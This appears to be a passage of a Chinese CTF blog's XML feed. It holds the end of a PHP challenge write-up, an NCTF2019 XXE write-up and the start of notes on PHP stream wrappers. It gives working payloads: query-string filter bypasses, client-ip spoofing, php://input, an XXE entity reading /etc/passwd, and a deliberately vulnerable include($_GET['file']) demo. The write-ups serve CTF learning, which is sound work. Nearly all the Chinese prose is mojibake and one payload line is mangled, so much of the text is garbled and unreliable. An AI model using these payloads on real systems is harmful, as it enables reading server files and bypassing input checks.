<h2 id="å‰ç½®çŸ¥è¯†">2.1. å‰ç½®çŸ¥è¯†</h2>
<h3 id="server">2.1.1. <code>$_SERVER</code></h3>
<blockquote>
<p>$_SERVER æ˜¯ PHP é¢„å®šä¹‰å˜é‡ä¹‹ä¸€ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨ï¼Œå®ƒæ˜¯ä¸€ä¸ªåŒ…å«äº†è¯¸å¦‚å¤´ä¿¡æ¯ï¼ˆheaderï¼‰ã€è·¯å¾„ï¼ˆpathï¼‰åŠè„šæœ¬ä½ç½®ï¼ˆscript locationsï¼‰ä¿¡æ¯çš„æ•°ç»„ã€‚</p>
</blockquote>
<p>å‚è€ƒé“¾æ¥ï¼š</p>
<ul>
<li>c.biancheng.net/view/6185.html</li>
</ul>
<p>è¿™é‡Œä¸»è¦ä»‹ç»ä¸€ä¸‹é¢˜ç›®ä¸­çš„<code>$_SERVER['QUERY_STRING']</code>ã€‚å‡è®¾æˆ‘ä»¬çš„urlä¸º <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.hdfzzf.com/index.php/?name=m1ku&amp;city=beijing</span><br></pre></td></tr></table></figure></p>
<p>é‚£ä¹ˆç»è¿‡<code>$query = $_SERVER['QUERY_STRING'];</code>ä¹‹åï¼Œ<code>$query</code>å˜ä¸ºï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$query = name=m1ku&amp;city=beijing</span><br></pre></td></tr></table></figure></p>
<p>å³ï¼Œè¯¥ä»£ç ä½œç”¨å°±æ˜¯è·å¾—urlä¸­çš„å‚æ•°éƒ¨åˆ†ã€‚</p>
<h3 id="substr_count">2.1.2. substr_count()</h3>
<p>è¯¥å‡½æ•°çš„ä½œç”¨éå¸¸ç®€å•ï¼Œé‚£å°±æ˜¯<strong>è®¡ç®—å­ä¸²åœ¨å­—ç¬¦ä¸²ä¸­å‡ºç°çš„æ¬¡æ•°</strong>ã€‚</p>
<p>ä¸€ä¸ªä¾‹å­ï¼š <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// è®¡ç®— Shanghai åœ¨å­—ç¬¦ä¸²ä¸­å‡ºç°çš„æ¬¡æ•°</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> substr_count(<span class="string">&quot;I love Shanghai. Shanghai is the biggest city in china.&quot;</span>,<span class="string">&quot;Shanghai&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>ç»“æœä¸ºï¼š2</p>
<p>æ³¨æ„ï¼šè¯¥å‡½æ•°åŒºåˆ†å¤§å°å†™ã€‚å°†ä¸Šé¢ä¾‹å­ç¨ä½œä¿®æ”¹ï¼š <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// è®¡ç®— shanghai åœ¨å­—ç¬¦ä¸²ä¸­å‡ºç°çš„æ¬¡æ•°</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> substr_count(<span class="string">&quot;I love Shanghai. Shanghai is the biggest city in china.&quot;</span>,<span class="string">&quot;shanghai&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>æ­¤æ—¶ç»“æœä¸ºï¼š0</p>
<h3 id="preg_matchpattern-string">2.1.3. preg_match(pattern, string)</h3>
<p>PHPä¸­çš„æ­£åˆ™åŒ¹é…ï¼Œè¿”å›å€¼æ˜¯åŒ¹é…æ¬¡æ•°ã€‚<strong>å®ƒçš„å€¼ä¸º0æˆ–è€…1</strong>ï¼Œè¿™æ˜¯å› ä¸ºç¬¬ä¸€æ¬¡åŒ¹é…åˆ°çš„æ—¶å€™å°±ä¼šç»“æŸè¯¥å‡½æ•°ã€‚å¦‚æœéœ€è¦ä¸€ç›´æœç´¢åˆ°ç»“å°¾ï¼Œå¯ä»¥ä½¿ç”¨preg_match_all(pattern, string)ã€‚</p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæ­£åˆ™åŒ¹é…é»˜è®¤éƒ½æ˜¯åŒ¹é…ä¸€è¡Œçš„ï¼Œå¦‚æœéœ€è¦åŒ¹é…å¤šè¡Œï¼Œéœ€è¦åœ¨æ­£åˆ™è¡¨è¾¾å¼çš„æœ€ååŠ ä¸Š<code>m</code>ã€‚</p>
<h3 id="getip">2.1.4. getIp()</h3>
<p>æºç å¦‚ä¸‹ï¼š <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getIp</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_CLIENT_IP&quot;</span>] &amp;&amp; strcasecmp(<span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_CLIENT_IP&quot;</span>], <span class="string">&quot;unknown&quot;</span>)) &#123;</span><br><span class="line">        <span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_CLIENT_IP&quot;</span>];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_X_FORWARDED_FOR&quot;</span>] &amp;&amp; strcasecmp(<span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_X_FORWARDED_FOR&quot;</span>], <span class="string">&quot;unknown&quot;</span>)) &#123;</span><br><span class="line">            <span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_X_FORWARDED_FOR&quot;</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>] &amp;&amp; strcasecmp(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>], <span class="string">&quot;unknown&quot;</span>)) &#123;</span><br><span class="line">                <span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">isset</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) &amp;&amp; <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] &amp;&amp; strcasecmp(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>],</span><br><span class="line">                        <span class="string">&quot;unknown&quot;</span>)</span><br><span class="line">                ) &#123;</span><br><span class="line">                    <span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="variable">$ip</span> = <span class="string">&quot;unknown&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (<span class="variable">$ip</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> getIp();</span><br></pre></td></tr></table></figure></p>
<p>ç®€å•æ€»ç»“ä¸€ä¸‹å°±æ˜¯è¯¥å‡½æ•°é€šè¿‡HTTPå¤´éƒ¨ä¸­çš„<code>client-ip</code>æ¥è·å–å®¢æˆ·ç«¯çš„IPã€‚</p>
<h2 id="è§£é¢˜è¿‡ç¨‹">2.2. è§£é¢˜è¿‡ç¨‹</h2>
<h3 id="å¥—å¨ƒ1">2.2.1. å¥—å¨ƒ1</h3>
<p>æ ¹æ®ä»£ç å®¡è®¡å¯ä»¥çŸ¥é“ï¼š</p>
<ul>
<li>è¦ç»•è¿‡ifï¼Œå³æŸ¥è¯¢è¯­å¥ä¸èƒ½åŒ…å«<code>_</code>ä»¥åŠ<code>%5f</code>ï¼Œåè€…å°±æ˜¯å‰è€…urlç¼–ç ä¹‹åçš„ç»“æœï¼›</li>
<li>b_u_p_tçš„å€¼ä¸èƒ½ä¸º23333ï¼Œåˆå¾—æ»¡è¶³preg_matchå‡½æ•°çš„è¿”å›å€¼ä¸º1</li>
</ul>
<p>å› ä¸ºsubstr_count()å‡½æ•°åŒºåˆ†å¤§å°å†™ï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨å¤§å°å†™ç»•è¿‡ï¼Œå³<code>%5F</code>å³å¯ã€‚</p>
<p>è€Œpreg_matché»˜è®¤åªåŒ¹é…ä¸€è¡Œï¼Œå‡è®¾æˆ‘ä»¬è¾“å…¥å¦‚ä¸‹ï¼š(%oaæ˜¯æ¢è¡Œç¬¦çš„urlç¼–ç ) <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">23333%0a</span><br></pre></td></tr></table></figure></p>
<p>é‚£ä¹ˆpreg_matchå‡½æ•°åªåŒ¹é…ç¬¬ä¸€è¡Œï¼Œç¬¬ä¸€è¡Œåªæœ‰23333ï¼Œå› æ­¤æ»¡è¶³ä»¥23333å¼€å¤´ï¼Œä»¥23333ç»“å°¾çš„è¦æ±‚ï¼Œä»è€Œè¿”å›å€¼ä¸º1ã€‚å¹¶ä¸”ï¼Œæ­¤æ—¶çš„å€¼ä¸æ˜¯23333ï¼Œå› ä¸ºæœ€åæœ‰ä¸€ä¸ªæ¢è¡Œç¬¦ï¼Œå› æ­¤ç»•è¿‡å¼ºç±»å‹åŒ¹é…ã€‚</p>
<p>ä»è€Œpayloadä¸ºï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?b%5Fu%5Fp%5Ft=23333%0a</span><br></pre></td></tr></table></figure></p>
<p>å¾—åˆ°å¦‚ä¸‹æç¤ºï¼š</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220421094613.png" /></p>
<h3 id="å¥—å¨ƒ2">2.2.2. å¥—å¨ƒ2</h3>
<p>å»è®¿é—®å¯¹åº”çš„æ–‡ä»¶ï¼Œå¾—åˆ°å¦‚ä¸‹æç¤ºï¼šï¼ˆæˆ‘è¿˜ä»¥ä¸ºæ”¹ä¸€ä¸‹XFFå°±å¯ä»¥ï¼Œå¤©çœŸï¼‰ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Flag is here~But how to get it?Local access only!  </span><br><span class="line">Sorry,you don&#x27;t have permission! Your ip is :sorry,this way is banned!</span><br></pre></td></tr></table></figure></p>
<p>æŸ¥çœ‹æºç ï¼Œå¾—åˆ°ä¸€ä¸²ä¸çŸ¥åçš„æ³¨é‡Šï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªå°æŠ€å·§ï¼Œå¯ä»¥å°†è¿™ä¸ªæ³¨é‡Šæ”¾å…¥æ§åˆ¶å°æ‰§è¡Œã€‚</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220421094919.png" /></p>
<p>å› æ­¤POSTè¯·æ±‚ï¼Œå¸¦å…¥å‚æ•°Merakï¼Œå¾—åˆ°å¦‚ä¸‹æºç ï¼š <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;takeip.php&#x27;</span>;</span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;.&#x27;</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;Merak&#x27;</span>]))&#123; </span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line">    <span class="keyword">die</span>(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params"><span class="variable">$v</span></span>)</span>&#123; </span><br><span class="line">    <span class="variable">$v</span> = base64_decode(<span class="variable">$v</span>); </span><br><span class="line">    <span class="variable">$re</span> = <span class="string">&#x27;&#x27;</span>; </span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;strlen(<span class="variable">$v</span>);<span class="variable">$i</span>++)&#123; </span><br><span class="line">        <span class="variable">$re</span> .= chr ( ord (<span class="variable">$v</span>[<span class="variable">$i</span>]) + <span class="variable">$i</span>*<span class="number">2</span> ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$re</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Local access only!&#x27;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$ip</span> = getIp();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span>!=<span class="string">&#x27;127.0.0.1&#x27;</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Sorry,you don&#x27;t have permission!  Your ip is :&quot;</span>.<span class="variable">$ip</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span> === <span class="string">&#x27;127.0.0.1&#x27;</span> &amp;&amp; file_get_contents(<span class="variable">$_GET</span>[<span class="string">&#x27;2333&#x27;</span>]) === <span class="string">&#x27;todat is a happy day&#x27;</span> )&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Your REQUEST is:&quot;</span>.change(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(change(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])); &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>ä»æºç ä¸­å¯ä»¥å¾—åˆ°ä»¥ä¸‹ä¿¡æ¯ï¼š</p>
<ul>
<li>flagåº”è¯¥åœ¨flag.phpä¸­</li>
<li>è¿™é‡Œè·å¾—å®¢æˆ·ç«¯IPä¸æ˜¯é€šè¿‡XFFï¼Œè€Œæ˜¯é€šè¿‡client-ip</li>
<li>GETæ–¹å¼ä¼ å…¥2333ï¼Œå¹¶ä¸”å¾—æ»¡è¶³<code>file_get_contents($_GET['2333']) === 'todat is a happy day'</code></li>
<li>åˆ©ç”¨æœ€åçš„file_get_contents()è¯»å–flag.phpä¸­çš„å†…å®¹ï¼Œä½†æ˜¯éœ€è¦ç»è¿‡change()å‡½æ•°</li>
</ul>
<p>ç¬¬ä¸‰ç‚¹å¯ä»¥é€šè¿‡<code>php://input [POSTt] odat is happy day</code>ç»•è¿‡ã€‚</p>
<p>è¿™é‡Œä¸»è¦è¯´é¢ä¸€ä¸‹changeå‡½æ•°çš„ç»•è¿‡ã€‚æˆ‘ä»¬çš„ç›®çš„æ˜¯ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">change($_GET[&#x27;file&#x27;]) -&gt; flag.php</span><br></pre></td></tr></table></figure></p>
<p>å³ï¼Œæˆ‘ä»¬è¾“å…¥payloadï¼Œç»è¿‡changeå‡½æ•°ï¼Œå˜æˆflag.phpã€‚å› æ­¤æˆ‘ä»¬å¯ä»¥æ ¹æ®changeå‡½æ•°å†™å‡ºå®ƒçš„é€†è¿‡ç¨‹ã€‚ä»£ç å¦‚ä¸‹ï¼š <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span>(<span class="params">v</span>):</span>  </span><br><span class="line">    re = <span class="string">&#x27;&#x27;</span>  </span><br><span class="line">    v = base64.b64decode(v).decode(<span class="string">&#x27;utf-8&#x27;</span>) <span class="comment"># byte -&gt; str  </span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(v)):  </span><br><span class="line">        re += <span class="built_in">chr</span>((<span class="built_in">ord</span>(v[i]) + i*<span class="number">2</span>))  </span><br><span class="line">          </span><br><span class="line">    <span class="keyword">return</span> re  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unchange</span>(<span class="params">fileName</span>):</span>  </span><br><span class="line">    payload = <span class="string">&#x27;&#x27;</span>  </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(fileName)):  </span><br><span class="line">         payload += <span class="built_in">chr</span>(<span class="built_in">ord</span>(fileName[i]) - <span class="number">2</span>*i)  </span><br><span class="line">  </span><br><span class="line">    payload = base64.b64encode(payload.encode(<span class="string">&#x27;utf-8&#x27;</span>)) <span class="comment"># str -&gt; byte  </span></span><br><span class="line">    <span class="keyword">return</span> payload.decode(<span class="string">&#x27;utf-8&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:  </span><br><span class="line">    fileName = <span class="string">&#x27;flag.php&#x27;</span>  </span><br><span class="line">    payload = unchange(fileName)  </span><br><span class="line">    <span class="built_in">print</span>(payload)  <span class="comment"># æœ€ç»ˆçš„payload</span></span><br><span class="line">    <span class="built_in">print</span>(change(payload)) <span class="comment"># éªŒè¯æ˜¯å¦æ­£ç¡®</span></span><br></pre></td></tr></table></figure></p>
<p>æœ€åå¾—åˆ°payloadä¸ºï¼šZmpdYSZmXGI=</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220421095706.png" /></p>
<h1 id="æ€»ç»“">3. æ€»ç»“</h1>
<p>è€ƒå¯Ÿäº†ï¼š</p>
<ul>
<li>substr_count()åŒºåˆ†å¤§å°å†™</li>
<li>php://inputä¼ªåè®®ç»•è¿‡</li>
<li>å‡½æ•°é€†å‘</li>
</ul>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PHPä¼ªåè®®</tag>
        <tag>PHPåŸºç¡€çŸ¥è¯†</tag>
        <tag>å‡½æ•°é€†å‘</tag>
      </tags>
  </entry>
  <entry>
    <title>NCTF2019 Fake XML cookbook</title>
    <url>/2022/04/08/NCTF2019%20Fake%20XML%20cookbook/</url>
    <content><![CDATA[<p>é¢˜ç›®åœ°å€ï¼š<a href="https://buuoj.cn/challenges#%5BNCTF2019%5DFake%20XML%20cookbook">NCTF2019 Fake XML cookbook</a></p>
<span id="more"></span>
<h1 id="é¢˜ç›®ä¿¡æ¯">é¢˜ç›®ä¿¡æ¯</h1>
<p>è¿›å…¥ç¯å¢ƒï¼Œæ˜¾ç¤ºå¦‚ä¸‹çš„ç™»é™†ç•Œé¢ï¼š</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408172459.png" /></p>
<p>ç”±é¢˜ç›®å¯çŸ¥ï¼Œæœ¬é¢˜è€ƒå¯Ÿçš„åº”è¯¥æ˜¯XXEæ¼æ´ã€‚æŸ¥çœ‹äº†æºç ä¹‹åå‘ç°åªæœ‰ä¸€ä¸ªJavaScriptå‡½æ•°ï¼Œä½†æ˜¯æ²¡ä»€ä¹ˆä½œç”¨ã€‚å› æ­¤å…ˆéšä¾¿å¾€è¡¨å•è¾“å…¥æ•°æ®çœ‹ä¸€ä¸‹æ•ˆæœ</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408172659.png" /></p>
<p>å‘ç°ç”¨æˆ·åè¢«åŸå°ä¸åŠ¨çš„è¿”å›åˆ°é¡µé¢ï¼Œç»è¿‡å¤šæ¬¡æµ‹è¯•ï¼Œç¡®å®šäº†æ— è®ºç”¨æˆ·åè¾“å…¥ä»€ä¹ˆéƒ½ä¼šè¢«è¿”å›åˆ°ç•Œé¢ã€‚ç»“åˆé¢˜ç›®ï¼Œæœ‰ç†ç”±æ€€ç–‘è¿™é‡Œå­˜åœ¨ç€XXEæ¼æ´ã€‚å› æ­¤ï¼ŒæŠ“å–æ•°æ®åŒ…çœ‹çœ‹</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408172854.png" /></p>
<p>è¿™ä¸ªæäº¤çš„è¡¨å•çš„å°±æ˜¯XMLï¼Œå› æ­¤ï¼Œç¡®å®šå­˜åœ¨XXEæ¼æ´ï¼Œå¹¶ä¸”æ˜¯æœ‰å›æ˜¾çš„ã€‚</p>
<h1 id="è§£é¢˜">è§£é¢˜</h1>
<p>åœ¨POST bodyä¸­æ·»åŠ è¿™ä¹ˆä¸€å¥è¯ï¼š <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">hdf</span> [<span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span>]&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>ç„¶å<code>&lt;username&gt;</code>ä¸­çš„å†…å®¹æ”¹ä¸º<code>&amp;xxe;</code>ï¼Œå¹¶æäº¤æ•°æ®åŒ…ï¼Œå‘ç°æˆåŠŸè¯»å–æ–‡ä»¶å†…å®¹ï¼Œæ¥ä¸‹æ¥åªéœ€è¦è¯»å–flagå°±å¯ä»¥äº†ã€‚</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408173147.png" /></p>
<p>flagä¸€èˆ¬å°±åœ¨æ ¹ç›®å½•æˆ–è€…ç½‘ç«™å½“å‰ç›®å½•ï¼Œåå­—ä¸º<code>flag</code>ã€‚å› æ­¤ä¸€ä¸€å°è¯•ä¸€ä¸‹ã€‚</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408173237.png" /></p>
<p>å‘ç°ç›´æ¥å°±åœ¨æ ¹ç›®å½•ï¼ŒæˆåŠŸè¯»å–flagã€‚</p>
<h1 id="æ€»ç»“">æ€»ç»“</h1>
<p>è¿™æ˜¯æœ€ç®€å•çš„XXEæ¼æ´åˆ©ç”¨ã€‚</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>XXEæ¼æ´</tag>
      </tags>
  </entry>
  <entry>
    <title>PHPä¼ªåè®®</title>
    <url>/2022/04/29/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
    <content><![CDATA[<p>å…³äºPHPä¼ªåè®®çš„è®°å½•ã€‚</p>
<span id="more"></span>
<h1 id="ç®€ä»‹">1. ç®€ä»‹</h1>
<p>PHP å¸¦æœ‰å¾ˆå¤šå†…ç½® URL é£æ ¼çš„å°è£…åè®®ï¼Œå¯ç”¨äºç±»ä¼¼ fopen()ã€ copy()ã€ file_exists() å’Œ filesize() çš„æ–‡ä»¶ç³»ç»Ÿå‡½æ•°ã€‚ é™¤äº†è¿™äº›å°è£…åè®®ï¼Œè¿˜èƒ½é€šè¿‡ stream_wrapper_register() æ¥æ³¨å†Œè‡ªå®šä¹‰çš„å°è£…åè®®ã€‚</p>
<p>phpä¸­æ”¯æŒçš„ä¼ªåè®®æœ‰ï¼š <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>. file:<span class="comment">// â€” è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿ</span></span><br><span class="line"><span class="number">2</span>. http:<span class="comment">// â€” è®¿é—® HTTP(s) ç½‘å€</span></span><br><span class="line"><span class="number">3</span>. ftp:<span class="comment">// â€” è®¿é—® FTP(s) </span></span><br><span class="line"><span class="number">4</span>. URLsphp:<span class="comment">// â€” è®¿é—®å„ä¸ªè¾“å…¥/è¾“å‡ºæµï¼ˆI/O streamsï¼‰</span></span><br><span class="line"><span class="number">5</span>. zlib:<span class="comment">// â€” å‹ç¼©æµ</span></span><br><span class="line"><span class="number">6</span>. data:<span class="comment">// â€” æ•°æ®ï¼ˆRFC 2397ï¼‰</span></span><br><span class="line"><span class="number">7</span>. glob:<span class="comment">// â€” æŸ¥æ‰¾åŒ¹é…çš„æ–‡ä»¶è·¯å¾„æ¨¡å¼</span></span><br><span class="line"><span class="number">8</span>. phar:<span class="comment">// â€” PHP å½’æ¡£</span></span><br><span class="line"><span class="number">9</span>. ssh2:<span class="comment">// â€” Secure Shell 2</span></span><br><span class="line"><span class="number">10</span>. rar:<span class="comment">// â€” RAR</span></span><br><span class="line"><span class="number">11</span>. ogg:<span class="comment">// â€” éŸ³é¢‘æµ</span></span><br><span class="line"><span class="number">12</span>. expect:<span class="comment">// â€” å¤„ç†äº¤äº’å¼çš„æµ</span></span><br></pre></td></tr></table></figure></p>
<p>å®˜æ–¹æ–‡æ¡£ï¼š</p>
<ul>
<li><a href="https://www.php.net/manual/zh/wrappers.php">PHP: æ”¯æŒçš„åè®®å’Œå°è£…åè®® - Manual</a></li>
</ul>
<p>æ¼”ç¤ºçš„ä»£ç å¦‚ä¸‹ï¼š <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// test/test.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&#x27;please give a param named file by GET!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// D:\phpStudy2018\PHPTutorial\WWW\test\test.txt</span><br><span class="line">hello world</span><br></pre></td></tr></table></figure>
<h1 id="file-åè®®">2. file:// åè®®</h1>
<p>ä½œç”¨ï¼š</p>
<ul>
<li>è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿï¼Œæ–‡ä»¶ç³»ç»Ÿ æ˜¯ PHP ä½¿ç”¨çš„é»˜è®¤å°è£…åè®®ã€‚ å½“æŒ‡å®šäº†ä¸€ä¸ªç›¸å¯¹è·¯å¾„ï¼ˆä¸ä»¥<code>/ã€\ã€\\</code>æˆ– Windows ç›˜ç¬¦å¼€å¤´çš„è·¯å¾„ï¼‰æä¾›çš„è·¯å¾„å°†åŸºäºå½“å‰çš„å·¥ä½œç›®å½•ã€‚ åœ¨å¾ˆå¤šæƒ…å†µä¸‹æ˜¯è„šæœ¬æ‰€åœ¨çš„ç›®å½•ï¼Œé™¤éè¢«ä¿®æ”¹äº†ã€‚</li>
<li>file:// é»˜è®¤æ˜¯ç»å¯¹è·¯å¾„ã€‚å¦‚æœä½¿ç”¨ç›¸å¯¹è·¯å¾„åˆ™ä¸éœ€è¦å¸¦ä¸Šåè®®ã€‚</li>
</ul>
<p>æ¡ä»¶ï¼šï¼ˆå³ä½¿éƒ½æ˜¯offä¹Ÿå¯ä»¥ä½¿ç”¨è¯¥åè®®ï¼‰</p>
<ul>
<li>allow_url_fopen: off/on</li>
<li>allow_url_include: off/on</li>
</ul>
<p>ç¤ºä¾‹ï¼š</p>
<ol type="1">
<li><p><code>file://[æ–‡ä»¶çš„ç›¸å¯¹è·¯å¾„]</code>ï¼ˆæ­¤æ—¶ä¸éœ€è¦åŠ <code>file://</code>ï¼‰</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220429095713.png" /></p></li>
<li><p><code>file://[æ–‡ä»¶çš„ç»å¯¹è·¯å¾„]</code></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220429100316.png" /></p></li>
</ol>
<h1 id="php-åè®®">3. php:// åè®®</h1>
<p>ä½œç”¨ï¼š</p>
<ul>
<li>php://Â â€”Â è®¿é—®å„ä¸ªè¾“å…¥/è¾“å‡ºæµï¼ˆI/O streamsï¼‰ï¼Œé™¤äº†php://stdin, php://stdout å’Œ php://stderr</li>
<li>åœ¨ctfä¸­ï¼Œå¸¸ä½¿ç”¨php://input å’Œ php://filterï¼Œå…¶ä¸­å‰è€…ç”¨äºæ‰§è¡Œphpä»£ç ï¼Œåè€…ç”¨äºè¯»å–æ–‡ä»¶å†…å®¹ã€‚</li>
</ul>
<p>æ¡ä»¶ï¼š</p>
<ul>
<li>allow_url_fopen: off/on</li>
<li>allow_url_include: ä»…php://input php://stdin php://memory php://temp éœ€è¦on</li>
</ul>
<h2 id="phpinput">3.1. php://input</h2>
<p>php://inputä»£è¡¨å¯ä»¥è®¿é—®è¯·æ±‚çš„åŸå§‹æ•°æ®ï¼Œç®€å•æ¥è¯´POSTè¯·æ±‚çš„æƒ…å†µä¸‹ï¼Œphp://inputå¯ä»¥è·å–åˆ°postçš„æ•°æ®ã€‚</p>
<p>æ¯”è¾ƒç‰¹æ®Šçš„ä¸€ç‚¹ï¼Œenctype=â€multipart/form-dataâ€ çš„æ—¶å€™ php://input æ˜¯æ— æ•ˆçš„ã€‚</p>
<h2 id="phpoutput">3.2. php://output</h2>
<p>åªå†™çš„æ•°æ®æµï¼Œå…è®¸ä»¥ print å’Œ echo ä¸€æ ·çš„æ–¹å¼å†™å…¥åˆ°è¾“å‡ºç¼“å†²åŒºã€‚</p>
<h2 id="phpfd">3.3. php://fd</h2>
